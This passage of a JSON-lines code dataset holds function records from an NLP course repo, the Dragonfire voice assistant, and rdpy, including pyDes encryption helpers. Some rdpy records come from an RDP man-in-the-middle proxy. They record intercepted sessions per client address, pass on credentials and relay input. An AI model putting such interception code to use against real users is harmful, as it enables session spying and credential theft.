hypothesis_batch, hypothesis_mask):\n", "code": "similarity_matrix = premise_batch.bmm(hypothesis_batch.transpose(2, 1).contiguous())\n# Softmax attention weights.\nprem_hyp_attn = masked_softmax(similarity_matrix, hypothesis_mask)\nhyp_prem_attn = masked_softmax(similarity_matrix.transpose(1, 2).contiguous(), premise_mask)\n# Weighted sums of the hypotheses for the the premises attention,\n# and vice-versa for the attention of the hypotheses.\nattended_premises = weighted_sum(hypothesis_batch, prem_hyp_attn, premise_mask)\nattended_hypotheses = weighted_sum(premise_batch, hyp_prem_attn, hypothesis_mask)\nreturn attended_premises, attended_hypotheses", "path": "nlp-beginner-finish/task3/layers.py", "commit_date": "2020-04-08 00:00:00", "repo_name": "Alic-yuan/nlp-beginner-finish", "stars": 1241, "license": "None", "language": "python", "size": 128500}
{"docstring": "\"\"\"\nArguments:\n    x {torch.Tensor} -- input embeddings with shape [batch, seq_len, input_size]\nReturns:\n    output {torch.Tensor} -- [batch, seq_len, num_directions * hidden_size]\n\"\"\"\n", "func_signal": "def forward(self, x):\n", "code": "self.lstm.flatten_parameters()\noutput, _ = self.lstm(x)\nreturn output", "path": "nlp-beginner-finish/task3/model.py", "commit_date": "2020-04-08 00:00:00", "repo_name": "Alic-yuan/nlp-beginner-finish", "stars": 1241, "license": "None", "language": "python", "size": 128500}
{"docstring": "\"\"\"\nTest the accuracy of a model on some labelled test dataset.\nArgs:\n    model: The torch module on which testing must be performed.\n    dataloader: A DataLoader object to iterate over some dataset.\nReturns:\n    batch_time: The average time to predict the classes of a batch.\n    total_time: The total time to process the whole dataset.\n    accuracy: The accuracy of the model on the input data.\n\"\"\"\n# Switch the model to eval mode.\n", "func_signal": "def test(model, dataloader):\n", "code": "model.eval()\ndevice = model.device\ntime_start = time.time()\nbatch_time = 0.0\naccuracy = 0.0\nall_prob = []\nall_labels = []\n# Deactivate autograd for evaluation.\nwith torch.no_grad():\n    for (q, q_len, h, h_len, label) in dataloader:\n        batch_start = time.time()\n        # Move input and output data to the GPU if one is used.\n        q1 = q.to(device)\n        q1_lengths = q_len.to(device)\n        q2 = h.to(device)\n        q2_lengths = h_len.to(device)\n        labels = label.to(device)\n        _, probs = model(q1, q1_lengths, q2, q2_lengths)\n        accuracy += correct_predictions(probs, labels)\n        batch_time += time.time() - batch_start\n        all_prob.extend(probs[:, 1].cpu().numpy())\n        all_labels.extend(label)\nbatch_time /= len(dataloader)\ntotal_time = time.time() - time_start\naccuracy /= (len(dataloader.dataset))\nreturn batch_time, total_time, accuracy, roc_auc_score(all_labels, all_prob)", "path": "nlp-beginner-finish/task3/utils.py", "commit_date": "2020-04-08 00:00:00", "repo_name": "Alic-yuan/nlp-beginner-finish", "stars": 1241, "license": "None", "language": "python", "size": 128500}
{"docstring": "\"\"\"\n\u6a21\u5f0f\u4e00\uff1a\u968f\u673a\u751f\u6210\u8bd7\u6b4c\n\u6a21\u5f0f\u4e8c\uff1a\u751f\u6210\u85cf\u5934\u8bd7\n\u6a21\u5f0f\u4e09\uff1a\u7ed9\u5b9a\u9996\u53e5\u751f\u6210\u8bd7\n:return:\n\"\"\"\n", "func_signal": "def generate_poetry(self, mode=1, head_sentence=None):\n", "code": "poetry = ''\nif mode == 1 or (mode == 2 and head_sentence is None):\n    poetry = ''.join(self.generate_random())\nif mode == 2 and head_sentence is not None:\n    head_sentence = head_sentence.replace(',', u'\uff0c').replace('.', u'\u3002').replace('?', u'\uff1f')\n    poetry = ''.join(self.generate_head(head_sentence))\n\nreturn poetry", "path": "nlp-beginner-finish/task5/sample.py", "commit_date": "2020-04-10 00:00:00", "repo_name": "Alic-yuan/nlp-beginner-finish", "stars": 1241, "license": "None", "language": "python", "size": 128500}
{"docstring": "\"\"\"\nApply dropout to the input batch of sequences.\nArgs:\n    sequences_batch: A batch of sequences of vectors that will serve\n        as input to an RNN.\n        Tensor of size (batch, sequences_length, emebdding_dim).\nReturns:\n    A new tensor on which dropout has been applied.\n\"\"\"\n", "func_signal": "def forward(self, sequences_batch):\n", "code": "ones = sequences_batch.data.new_ones(sequences_batch.shape[0], sequences_batch.shape[-1])\ndropout_mask = nn.functional.dropout(ones, self.p, self.training, inplace=False)\nreturn dropout_mask.unsqueeze(1) * sequences_batch", "path": "nlp-beginner-finish/task3/layers.py", "commit_date": "2020-04-08 00:00:00", "repo_name": "Alic-yuan/nlp-beginner-finish", "stars": 1241, "license": "None", "language": "python", "size": 128500}
{"docstring": "\"\"\"Method that called whenever someone tweeted Dragonfire with a mention.\n\nArgs:\n    data (str):  String that contains data of the tweet.\n\"\"\"\n\n", "func_signal": "def on_data(self, data):\n", "code": "mention = json.loads(data)\n# print(json.dumps(mention, indent=4, sort_keys=True))\nif 'retweeted_status' not in mention:\n    tw_text = mention['text']\n    tw_user = mention['user']['screen_name']\n    if tw_user == \"DragonfireAI\":\n        return True\n    user_full_name = mention['user']['name']\n    user_prefix = mention['user']['name'].split()[0]\n    print(\"\\n@\" + tw_user + \" said:\")\n    print(tw_text)\n    tw_text = tw_text.replace(\"@DragonfireAI\", \"\")\n    tw_text = re.sub(r'([^\\s\\w\\?]|_)+', '', tw_text).strip()\n    her = VirtualAssistant(self.args, self.userin, user_full_name, user_prefix, tw_user)\n    thread.start_new_thread(her.command, (tw_text,))\nreturn True", "path": "Dragonfire/dragonfire/twitter.py", "commit_date": "2019-12-08 00:00:00", "repo_name": "DragonComputer/Dragonfire", "stars": 1374, "license": "mit", "language": "python", "size": 25246}
{"docstring": "\"\"\"Return a version of user's command that cleaned from punctuations, symbols, etc.\n\nArgs:\n    com (str):  User's command.\n\nReturns:\n    str:  Cleaned version of user's command.\n\"\"\"\n\n", "func_signal": "def clean(self, com):\n", "code": "doc = self.nlp(com)\nfor token in doc:\n    if token.pos_ in [\"PUNCT\", \"SYM\"]:\n        com = com.replace(token.tag_, '')\n\nreturn com", "path": "Dragonfire/dragonfire/learn.py", "commit_date": "2019-12-08 00:00:00", "repo_name": "DragonComputer/Dragonfire", "stars": 1374, "license": "mit", "language": "python", "size": 25246}
{"docstring": "\"\"\"Append the corresponding value of given word from a element mapper lists to the result.\n\nArgs:\n    array ((list) of (list) of (str)s):     List of list of strings.\n    str:                                    Word.\n    str:                                    Result.\n\nReturns:\n    bool:   True if the word exists in the mapper lists otherwise False\n\"\"\"\n\n", "func_signal": "def append_word_from_el_mappers(self, el_mapper_lists, word, result):\n", "code": "for el_mapper_list in el_mapper_lists:\n    if word.upper() in el_mapper_list:\n        result.append(el_mapper_list[word.upper()].lower().strip())\n        return True\nreturn False", "path": "Dragonfire/dragonfire/learn.py", "commit_date": "2019-12-08 00:00:00", "repo_name": "DragonComputer/Dragonfire", "stars": 1374, "license": "mit", "language": "python", "size": 25246}
{"docstring": "\"\"\"Initialization method of :class:`dragonfire.stray.SystemTrayIcon` class.\n\"\"\"\n\n", "func_signal": "def __init__(self):\n", "code": "import gi\ngi.require_version('Gtk', '3.0')\nfrom gi.repository import Gtk\nself.Gtk = Gtk\n\nself.icon = self.Gtk.StatusIcon()\nself.icon.set_title(\"Dragonfire\")\nif os.path.isfile(TRAY_ICON):\n    self.icon.set_from_file(TRAY_ICON)\nelse:\n    self.icon.set_from_file(DEVELOPMENT_DIR + TRAY_ICON_ALT)\nself.icon.connect('popup-menu', self.popup_menu)\nself.Gtk.main()", "path": "Dragonfire/dragonfire/stray.py", "commit_date": "2018-08-05 00:00:00", "repo_name": "DragonComputer/Dragonfire", "stars": 1374, "license": "mit", "language": "python", "size": 25246}
{"docstring": "\"\"\"Call this when no results found in Wikipedia.\n\nArgs:\n    search_query (str):  Topic extracted from user's input.\n\nReturns:\n    str:  Response.\n\"\"\"\n\n", "func_signal": "def wikipedia_no_results_found_error(self, search_query):\n", "code": "global user_prefix\n\nreturn self.userin.say(\"Sorry, \" + user_prefix + \". But I couldn't find anything about \" + search_query + \" in Wikipedia.\")", "path": "Dragonfire/dragonfire/__init__.py", "commit_date": "2019-12-18 00:00:00", "repo_name": "DragonComputer/Dragonfire", "stars": 1374, "license": "mit", "language": "python", "size": 25246}
{"docstring": "\"\"\"Function to mirror the answer (for example: I'M to YOU ARE).\n\nArgs:\n    answer (str):  Prepared answer that just before the actual return of :func:`respond` method.\n\nReturns:\n    str:  Response.\n\"\"\"\n\n", "func_signal": "def mirror(self, answer):\n", "code": "result = []\ntypes = []\ntypes.append(\"\")\ndoc = self.nlp(answer)\nfor token in doc:\n    types.append(token.lemma_)\n    # if it's a pronoun or it's an auxiliary that comes right after a pronoun mirror it\n    if token.lemma_ == \"-PRON-\" or ((token.lemma_ == \"be\" or token.dep_ == \"aux\") and types[-2] == \"-PRON-\"):\n        if self.append_word_from_el_mappers(\n            [\n                self.pronouns,\n                self.inv_pronouns,\n                self.auxiliaries,\n                self.inv_auxiliaries\n            ],\n            token.text,\n            result\n        ):\n            continue\n    result.append(token.text.strip())\nfor i in range(len(result)):\n    if result[i] == \"i\":\n        result[i] = \"I\"\nresult = ' '.join(result)  # concatenate the result\nreturn result.replace(\" '\", \"'\")  # fix for situations like \"I 'AM\", \"YOU 'LL\"", "path": "Dragonfire/dragonfire/learn.py", "commit_date": "2019-12-08 00:00:00", "repo_name": "DragonComputer/Dragonfire", "stars": 1374, "license": "mit", "language": "python", "size": 25246}
{"docstring": "\"\"\"Strips the search query by intent.\n\nArgs:\n    doc:                    spaCy result of the command\n    intent (str):           Intent e.g. YouTube, Wikipedia\n\nReturns:\n    (str):                  Search query.\n\"\"\"\n\n", "func_signal": "def strip_the_search_query_by_intent(self, doc, intent):\n", "code": "search_query = \"\"\nfor token in doc:\n    if not (token.lemma_ == \"search\" or token.lemma_ == \"find\" or token.lemma_ == intent or token.is_stop):\n        search_query += ' ' + token.text\nsearch_query = search_query.strip()\nreturn search_query", "path": "Dragonfire/dragonfire/__init__.py", "commit_date": "2019-12-18 00:00:00", "repo_name": "DragonComputer/Dragonfire", "stars": 1374, "license": "mit", "language": "python", "size": 25246}
{"docstring": "\"\"\"Function to get a record from the database.\n\nArgs:\n    subject (str):  Subject that extracted from the user's input/command.\n\nKeyword Args:\n    invert (bool):      Is it invert mode? (swap subject and clause)\n    is_public (int):    Is it a public record? (non-user specific)\n    user_id (int):      User's ID.\n\nReturns:\n    str:  Response.\n\"\"\"\n\n", "func_signal": "def db_get(self, subject, invert=False, is_public=True, user_id=None):\n", "code": "if self.is_server:\n    try:\n        fact = self.invert_fact_and_filter(invert, subject, user_id, is_public)\n        answer = fact.subject + ' ' + fact.verbtense + ' ' + fact.clause\n        return self.mirror(answer)\n    except NoResultFound:\n        return None\nelse:\n    if invert:\n        result = self.db.search(Query().clause == subject)  # make a database search by giving subject string (inverted)\n    else:\n        result = self.db.search(Query().subject == subject)  # make a database search by giving subject string\n    if result:  # if there is a result\n        dictionary = {}\n        for row in result:  # iterate over the rows of the result\n            if row['verbtense'] not in dictionary:  # if the verbtense is not in the keys of the dictionary\n                dictionary[row['verbtense']] = []  # then add it\n            if row['clause'] not in dictionary[row['verbtense']]:  # if the clause is not in the value like; dictionary['is']\n                dictionary[row['verbtense']].append(row['clause'])  # then append the clause\n        if invert:\n            answer = row['subject']  # in WHO questions subject is actually the clause so we learn the subject from db\n        else:\n            answer = subject  # the answer we will return\n        first_verbtense = False\n        for key, value in dictionary.items():  # iterate over the dictionary defined and assigned on above\n            if not first_verbtense:  # if the first verbtense assignment does not made yet\n                answer += ' ' + str(key)  # concatenate with a whitespace\n                first_verbtense = True\n            else:\n                answer += ', ' + str(key)  # otherwise concatenate with a comma + whitespace\n            first_clause = False\n            for clause in value:  # iterate over the clauses of the key\n                if not first_clause:  # if the first verbtense assignment does not made yet\n                    answer += ' ' + clause  # concatenate with a whitespace\n                    first_clause = True\n                else:\n                    answer += ' and ' + clause  # otherwise concatenate with ' AND '\n        return self.mirror(answer)  # mirror the answer (for example: I'M to YOU ARE)\n    else:\n        return None  # if there is no result return None", "path": "Dragonfire/dragonfire/learn.py", "commit_date": "2019-12-08 00:00:00", "repo_name": "DragonComputer/Dragonfire", "stars": 1374, "license": "mit", "language": "python", "size": 25246}
{"docstring": "\"\"\"The top-level method to indicate that there is a speech recognition error occurred.\n\nReturns:\n    str:  Response.\n\"\"\"\n\n", "func_signal": "def speech_error():\n", "code": "userin.execute([\"echo\"], \"An error occurred\")\nreturn userin.say(\"I couldn't understand, please repeat again.\")", "path": "Dragonfire/dragonfire/__init__.py", "commit_date": "2019-12-18 00:00:00", "repo_name": "DragonComputer/Dragonfire", "stars": 1374, "license": "mit", "language": "python", "size": 25246}
{"docstring": "\"\"\"Checks the wake up intent.\n\nReturns:\n    bool:  True if the expression matches othewise False.\n\"\"\"\n\n", "func_signal": "def check_wake_up_intent(self):\n", "code": "return self.h.directly_equal([\"dragonfire\", \"hey\"])\\\n    or (self.h.check_verb_lemma(\"wake\") and self.h.check_nth_lemma(-1, \"up\"))\\\n    or (self.h.check_nth_lemma(0, \"dragon\") and self.h.check_nth_lemma(1, \"fire\") and self.h.max_word_count(2))", "path": "Dragonfire/dragonfire/__init__.py", "commit_date": "2019-12-18 00:00:00", "repo_name": "DragonComputer/Dragonfire", "stars": 1374, "license": "mit", "language": "python", "size": 25246}
{"docstring": "\"\"\"Method to set an event listener for system tray icon exit.\n\nArgs:\n    e:  Event.\n\"\"\"\n\n", "func_signal": "def SystemTrayExitListenerSet(e):\n", "code": "global global_event_holder\nglobal_event_holder = e", "path": "Dragonfire/dragonfire/stray.py", "commit_date": "2018-08-05 00:00:00", "repo_name": "DragonComputer/Dragonfire", "stars": 1374, "license": "mit", "language": "python", "size": 25246}
{"docstring": "\"\"\"Start the file manager application.\n\nReturns:\n    str:  Response.\n\"\"\"\n\n", "func_signal": "def start_file_manager(self):\n", "code": "self.userin.execute([\"dolphin\"], \"File Manager\")  # KDE neon\nself.userin.execute([\"pantheon-files\"], \"File Manager\")  # elementary OS\nself.userin.execute([\"nautilus\", \"--browser\"], \"File Manager\")  # Ubuntu\nreturn self.userin.say(\"File Manager\")", "path": "Dragonfire/dragonfire/__init__.py", "commit_date": "2019-12-18 00:00:00", "repo_name": "DragonComputer/Dragonfire", "stars": 1374, "license": "mit", "language": "python", "size": 25246}
{"docstring": "\"\"\"Return capitalized and uppercased versions of the strings inside the given array.\n\nArgs:\n    array ((list) of (str)s):  List of strings.\n\nReturns:\n    (list) of (str)s:  List of strings.\n\"\"\"\n\n", "func_signal": "def upper_capitalize(self, array):\n", "code": "result = []\nfor word in array:\n    result.append(word)\n    result.append(word.capitalize())\n    result.append(word.upper())\nreturn result", "path": "Dragonfire/dragonfire/learn.py", "commit_date": "2019-12-08 00:00:00", "repo_name": "DragonComputer/Dragonfire", "stars": 1374, "license": "mit", "language": "python", "size": 25246}
{"docstring": "\"\"\"Method to start Wikipedia search.\n\nArgs:\n    search_query (str):  Topic extracted from user's input.\n\nReturns:\n    str:  Response.\n\"\"\"\n\n", "func_signal": "def wikisearch(self, search_query):\n", "code": "wikiresult = wikipedia.search(search_query)\nif len(wikiresult) == 0:\n    raise WikipediaNoResultsFoundError()\nwikipage = wikipedia.page(wikiresult[0])\nwikicontent = TextToAction.fix_the_encoding_in_text_for_tts(wikipage.content)\nwikicontent = re.sub(r'\\([^)]*\\)', '', wikicontent)\nself.userin.execute([\"sensible-browser\", wikipage.url], search_query)\nreturn self.userin.say(wikicontent, cmd=[\"sensible-browser\", wikipage.url])", "path": "Dragonfire/dragonfire/__init__.py", "commit_date": "2019-12-18 00:00:00", "repo_name": "DragonComputer/Dragonfire", "stars": 1374, "license": "mit", "language": "python", "size": 25246}
{"docstring": "\"\"\"Determine whether user is talking about himself/herself or some other entity.\n\nArgs:\n    noun_chunk (str):  Noun phrase.\n\nReturns:\n    ((str), (bool)):  Detected pronoun and boolean value depends on the detection.\n\"\"\"\n\n", "func_signal": "def detect_pronoun(self, noun_chunk):\n", "code": "np_text = \"\"\nis_public = True\ndoc = self.nlp(noun_chunk)\nfor token in doc:\n    if token.lemma_ == \"-PRON-\":\n        np_text += ' ' + token.text.lower()\n        is_public = False\n    else:\n        np_text += ' ' + token.text\nreturn np_text.strip(), is_public", "path": "Dragonfire/dragonfire/learn.py", "commit_date": "2019-12-08 00:00:00", "repo_name": "DragonComputer/Dragonfire", "stars": 1374, "license": "mit", "language": "python", "size": 25246}
{"docstring": "\"\"\"Call this when a connection error to Wikipedia's servers occurs.\n\nReturns:\n    str:  Response.\n\"\"\"\n\n", "func_signal": "def wikipedia_connection_error(self):\n", "code": "global user_prefix\n\nself.userin.execute([\" \"], \"Wikipedia connection error.\")\nreturn self.userin.say(\"Sorry, \" + user_prefix + \". But I'm unable to connect to Wikipedia servers.\")", "path": "Dragonfire/dragonfire/__init__.py", "commit_date": "2019-12-18 00:00:00", "repo_name": "DragonComputer/Dragonfire", "stars": 1374, "license": "mit", "language": "python", "size": 25246}
{"docstring": "\"\"\"The top-level method to greet the user with message like \"*Good morning, sir.*\".\n\nArgs:\n    userin:  :class:`dragonfire.utilities.TextToAction` instance.\n\nReturns:\n    str:  Response.\n\"\"\"\n\n", "func_signal": "def greet(userin):\n", "code": "(columns, lines) = shutil.get_terminal_size()\nprint(columns * \"_\" + \"\\n\")\ntime = datetime.datetime.now().time()\n\nglobal user_full_name\nglobal user_prefix\nglobal config_file\n\ncommand = \"getent passwd $LOGNAME | cut -d: -f5 | cut -d, -f1\"\nuser_full_name = os.popen(command).read()\nuser_full_name = user_full_name[:-1]  # .decode(\"utf8\")\nhome = expanduser(\"~\")\nconfig_file = TinyDB(home + '/.dragonfire_config.json')\ncallme_config = config_file.search(Query().datatype == 'callme')\nif callme_config:\n    user_prefix = callme_config[0]['title']\nelse:\n    gender_config = config_file.search(Query().datatype == 'gender')\n    if gender_config:\n        user_prefix = GENDER_PREFIX[gender_config[0]['gender']]\n    else:\n        gender = Classifier.gender(user_full_name.split(' ', 1)[0])\n        config_file.insert({'datatype': 'gender', 'gender': gender})\n        user_prefix = GENDER_PREFIX[gender]\n\nif datetime.time(4) < time < datetime.time(12):\n    time_of_day = \"morning\"\nelif datetime.time(12) < time < datetime.time(18):\n    time_of_day = \"afternoon\"\nelif datetime.time(18) < time < datetime.time(22):\n    time_of_day = \"evening\"\nelse:\n    time_of_day = \"night\"\nuserin.execute([\"echo\"], \"To activate say 'Dragonfire!' or 'Wake Up!'\")\nreturn userin.say(\" \".join([\"Good\", time_of_day, user_prefix]))", "path": "Dragonfire/dragonfire/__init__.py", "commit_date": "2019-12-18 00:00:00", "repo_name": "DragonComputer/Dragonfire", "stars": 1374, "license": "mit", "language": "python", "size": 25246}
{"docstring": "\"\"\"Presses the keys according to the navigation browser in history intent.\n\nArgs:\n    direction (str):  'back' or 'forward'.\n\nReturns:\n    str:  'back' or 'forward'.\n\"\"\"\n\n", "func_signal": "def press_browser_history_nav(self, direction):\n", "code": "with nostdout():\n    with nostderr():\n        k = PyKeyboard()\n        if not self.testing:\n            if direction == \"back\":\n                k.press_keys([k.alt_l_key, k.left_key])\n            elif direction == \"forward\":\n                k.press_keys([k.alt_l_key, k.right_key])\n            else:\n                pass\nreturn direction", "path": "Dragonfire/dragonfire/__init__.py", "commit_date": "2019-12-18 00:00:00", "repo_name": "DragonComputer/Dragonfire", "stars": 1374, "license": "mit", "language": "python", "size": 25246}
{"docstring": "\"\"\"The top-level method to serve as the entry point of Dragonfire.\n\nThis method is the entry point defined in `setup.py` for the `dragonfire` executable that\nplaced a directory in `$PATH`.\n\nThis method parses the command-line arguments and handles the top-level initiations accordingly.\n\"\"\"\n\n", "func_signal": "def initiate():\n", "code": "ap = argparse.ArgumentParser()\nap.add_argument(\"-c\", \"--cli\", help=\"Command-line interface mode. Give commands to Dragonfire via command-line inputs (keyboard) instead of audio inputs (microphone).\", action=\"store_true\")\nap.add_argument(\"-s\", \"--silent\", help=\"Silent mode. Disable Text-to-Speech output. Dragonfire won't generate any audio output.\", action=\"store_true\")\nap.add_argument(\"-j\", \"--headless\", help=\"Headless mode. Do not display an avatar animation on the screen. Disable the female head model.\", action=\"store_true\")\nap.add_argument(\"-v\", \"--verbose\", help=\"Increase verbosity of log output.\", action=\"store_true\")\nap.add_argument(\"-g\", \"--gspeech\", help=\"Instead of using the default speech recognition method(Mozilla DeepSpeech), use Google Speech Recognition service. (more accurate results)\", action=\"store_true\")\nap.add_argument(\"--server\", help=\"Server mode. Disable any audio functionality, serve a RESTful spaCy API and become a Twitter integrated chatbot.\", metavar=\"REG_KEY\")\nap.add_argument(\"-p\", \"--port\", help=\"Port number for server mode.\", default=\"3301\", metavar=\"PORT\")\nap.add_argument(\"--version\", help=\"Display the version number of Dragonfire.\", action=\"store_true\")\nap.add_argument(\"--db\", help=\"Specificy the database engine for the knowledge base of learning feature. Values: 'mysql' for MySQL, 'sqlite' for SQLite. Default database engine is SQLite.\", action=\"store\", type=str)\nargs = vars(ap.parse_args())\nif args[\"version\"]:\n    import pkg_resources\n    print(pkg_resources.get_distribution(\"dragonfire\").version)\n    sys.exit(1)\ntry:\n    global dc\n    userin = TextToAction(args)\n    if not args[\"server\"]:\n        SystemTrayExitListenerSet(e)\n        stray_proc = Process(target=SystemTrayInit)\n        stray_proc.start()\n        greet(userin)\n    start(args, userin)\nexcept KeyboardInterrupt:\n    if not args[\"server\"]:\n        stray_proc.terminate()\n    sys.exit(1)", "path": "Dragonfire/dragonfire/__init__.py", "commit_date": "2019-12-18 00:00:00", "repo_name": "DragonComputer/Dragonfire", "stars": 1374, "license": "mit", "language": "python", "size": 25246}
{"docstring": "\"\"\"Method to exit the system tray icon.\n\nKeyword Args:\n    data :  *Unknown*\n\"\"\"\n\n", "func_signal": "def exit(self, data=None):\n", "code": "self.Gtk.main_quit()\nglobal global_event_holder\nglobal_event_holder.set()", "path": "Dragonfire/dragonfire/stray.py", "commit_date": "2018-08-05 00:00:00", "repo_name": "DragonComputer/Dragonfire", "stars": 1374, "license": "mit", "language": "python", "size": 25246}
{"docstring": "# Only accept byte strings or ascii unicode values, otherwise\n# there is no way to correctly decode the data into bytes.\n", "func_signal": "def _guardAgainstUnicode(self, data):\n", "code": "if _pythonMajorVersion < 3:\n    if isinstance(data, unicode):\n        raise ValueError(\"pyDes can only work with bytes, not Unicode strings.\")\nelse:\n    if isinstance(data, str):\n        # Only accept ascii unicode values.\n        try:\n            return data.encode('ascii')\n        except UnicodeEncodeError:\n            pass\n        raise ValueError(\"pyDes can only work with encoded strings, not Unicode.\")\nreturn data", "path": "rdpy/rdpy/security/pyDes.py", "commit_date": "2014-12-23 00:00:00", "repo_name": "citronneur/rdpy", "stars": 1650, "license": "gpl-3.0", "language": "python", "size": 1035}
{"docstring": "# Pad data depending on the mode\n", "func_signal": "def _padData(self, data, pad, padmode):\n", "code": "if padmode is None:\n    # Get the default padding mode.\n    padmode = self.getPadMode()\nif pad and padmode == PAD_PKCS5:\n    raise ValueError(\"Cannot use a pad character with PAD_PKCS5\")\n\nif padmode == PAD_NORMAL:\n    if len(data) % self.block_size == 0:\n        # No padding required.\n        return data\n\n    if not pad:\n        # Get the default padding.\n        pad = self.getPadding()\n    if not pad:\n        raise ValueError(\"Data must be a multiple of \" + str(self.block_size) + \" bytes in length. Use padmode=PAD_PKCS5 or set the pad character.\")\n    data += (self.block_size - (len(data) % self.block_size)) * pad\n\nelif padmode == PAD_PKCS5:\n    pad_len = 8 - (len(data) % self.block_size)\n    if _pythonMajorVersion < 3:\n        data += pad_len * chr(pad_len)\n    else:\n        data += bytes([pad_len] * pad_len)\n\nreturn data", "path": "rdpy/rdpy/security/pyDes.py", "commit_date": "2014-12-23 00:00:00", "repo_name": "citronneur/rdpy", "stars": 1650, "license": "gpl-3.0", "language": "python", "size": 1035}
{"docstring": "\"\"\"Will set the Initial Value, used in conjunction with CBC mode\"\"\"\n", "func_signal": "def setIV(self, IV):\n", "code": "if not IV or len(IV) != self.block_size:\n    raise ValueError(\"Invalid Initial Value (IV), must be a multiple of \" + str(self.block_size) + \" bytes\")\nIV = self._guardAgainstUnicode(IV)\nself._iv = IV", "path": "rdpy/rdpy/security/pyDes.py", "commit_date": "2014-12-23 00:00:00", "repo_name": "citronneur/rdpy", "stars": 1650, "license": "gpl-3.0", "language": "python", "size": 1035}
{"docstring": "\"\"\"\n@param controller: {rdp.RDPServerController}\n@param addr: destination address\n@see: rdp.ServerFactory.buildObserver\n\"\"\"\n", "func_signal": "def buildObserver(self, controller, addr):\n", "code": "self._uniqueId += 1\nreturn ProxyServer(controller, self._target, self._clientSecurity, rss.createRecorder(os.path.join(self._ouputDir, \"%s_%s_%s.rss\" % (time.strftime('%Y%m%d%H%M%S'), addr.host, self._uniqueId))))", "path": "rdpy/bin/rdpy-rdpmitm.py", "commit_date": "2018-08-06 00:00:00", "repo_name": "citronneur/rdpy", "stars": 1650, "license": "gpl-3.0", "language": "python", "size": 1035}
{"docstring": "\"\"\"\n@param controller: {rdp.RDPClientController}\n@param server: {ProxyServer} \n\"\"\"\n", "func_signal": "def __init__(self, controller, server):\n", "code": "rdp.RDPClientObserver.__init__(self, controller)\nself._server = server", "path": "rdpy/bin/rdpy-rdpmitm.py", "commit_date": "2018-08-06 00:00:00", "repo_name": "citronneur/rdpy", "stars": 1650, "license": "gpl-3.0", "language": "python", "size": 1035}
{"docstring": "\"\"\"encrypt(data, [pad], [padmode]) -> bytes\n\ndata : Bytes to be encrypted\npad  : Optional argument for encryption padding. Must only be one byte\npadmode : Optional argument for overriding the padding mode.\n\nThe data must be a multiple of 8 bytes and will be encrypted\nwith the already specified key. Data does not have to be a\nmultiple of 8 bytes if the padding character is supplied, or\nthe padmode is set to PAD_PKCS5, as bytes will then added to\nensure the be padded data is a multiple of 8 bytes.\n\"\"\"\n", "func_signal": "def encrypt(self, data, pad=None, padmode=None):\n", "code": "data = self._guardAgainstUnicode(data)\nif pad is not None:\n    pad = self._guardAgainstUnicode(pad)\ndata = self._padData(data, pad, padmode)\nreturn self.crypt(data, des.ENCRYPT)", "path": "rdpy/rdpy/security/pyDes.py", "commit_date": "2014-12-23 00:00:00", "repo_name": "citronneur/rdpy", "stars": 1650, "license": "gpl-3.0", "language": "python", "size": 1035}
{"docstring": "\"\"\"setPadding() -> bytes of length 1. Padding character.\"\"\"\n", "func_signal": "def setPadding(self, pad):\n", "code": "if pad is not None:\n    pad = self._guardAgainstUnicode(pad)\nself._padding = pad", "path": "rdpy/rdpy/security/pyDes.py", "commit_date": "2014-12-23 00:00:00", "repo_name": "citronneur/rdpy", "stars": 1650, "license": "gpl-3.0", "language": "python", "size": 1035}
{"docstring": "\"\"\"\n@summary: Build observer\n@param controller: rdp.RDPClientController\n@param addr: destination address\n@see: rdp.ClientFactory.buildObserver\n@return: ProxyClient\n\"\"\"\n# set screen resolution\n", "func_signal": "def buildObserver(self, controller, addr):\n", "code": "controller.setScreen(self._width, self._height)\n# set credential\ncontroller.setDomain(self._domain)\ncontroller.setUsername(self._username)\ncontroller.setPassword(self._password)\ncontroller.setSecurityLevel(self._security)\ncontroller.setPerformanceSession()\nreturn ProxyClient(controller, self._server)", "path": "rdpy/bin/rdpy-rdpmitm.py", "commit_date": "2018-08-06 00:00:00", "repo_name": "citronneur/rdpy", "stars": 1650, "license": "gpl-3.0", "language": "python", "size": 1035}
{"docstring": "\"\"\"encrypt(data, [pad], [padmode]) -> bytes\n\ndata : bytes to be encrypted\npad  : Optional argument for encryption padding. Must only be one byte\npadmode : Optional argument for overriding the padding mode.\n\nThe data must be a multiple of 8 bytes and will be encrypted\nwith the already specified key. Data does not have to be a\nmultiple of 8 bytes if the padding character is supplied, or\nthe padmode is set to PAD_PKCS5, as bytes will then added to\nensure the be padded data is a multiple of 8 bytes.\n\"\"\"\n", "func_signal": "def encrypt(self, data, pad=None, padmode=None):\n", "code": "ENCRYPT = des.ENCRYPT\nDECRYPT = des.DECRYPT\ndata = self._guardAgainstUnicode(data)\nif pad is not None:\n    pad = self._guardAgainstUnicode(pad)\n# Pad the data accordingly.\ndata = self._padData(data, pad, padmode)\nif self.getMode() == CBC:\n    self.__key1.setIV(self.getIV())\n    self.__key2.setIV(self.getIV())\n    self.__key3.setIV(self.getIV())\n    i = 0\n    result = []\n    while i < len(data):\n        block = self.__key1.crypt(data[i:i+8], ENCRYPT)\n        block = self.__key2.crypt(block, DECRYPT)\n        block = self.__key3.crypt(block, ENCRYPT)\n        self.__key1.setIV(block)\n        self.__key2.setIV(block)\n        self.__key3.setIV(block)\n        result.append(block)\n        i += 8\n    if _pythonMajorVersion < 3:\n        return ''.join(result)\n    else:\n        return bytes.fromhex('').join(result)\nelse:\n    data = self.__key1.crypt(data, ENCRYPT)\n    data = self.__key2.crypt(data, DECRYPT)\n    return self.__key3.crypt(data, ENCRYPT)", "path": "rdpy/rdpy/security/pyDes.py", "commit_date": "2014-12-23 00:00:00", "repo_name": "citronneur/rdpy", "stars": 1650, "license": "gpl-3.0", "language": "python", "size": 1035}
{"docstring": "\"\"\"\n@summary: Event call on mouse event\n@param x: {int} x position\n@param y: {int} y position\n@param button: {int} 1, 2, 3, 4 or 5 button\n@param isPressed: {bool} True if mouse button is pressed\n@see: rdp.RDPServerObserver.onPointerEvent\n\"\"\"\n", "func_signal": "def onPointerEvent(self, x, y, button, isPressed):\n", "code": "if self._client is None:\n    return\nself._client._controller.sendPointerEvent(x, y, button, isPressed)", "path": "rdpy/bin/rdpy-rdpmitm.py", "commit_date": "2018-08-06 00:00:00", "repo_name": "citronneur/rdpy", "stars": 1650, "license": "gpl-3.0", "language": "python", "size": 1035}
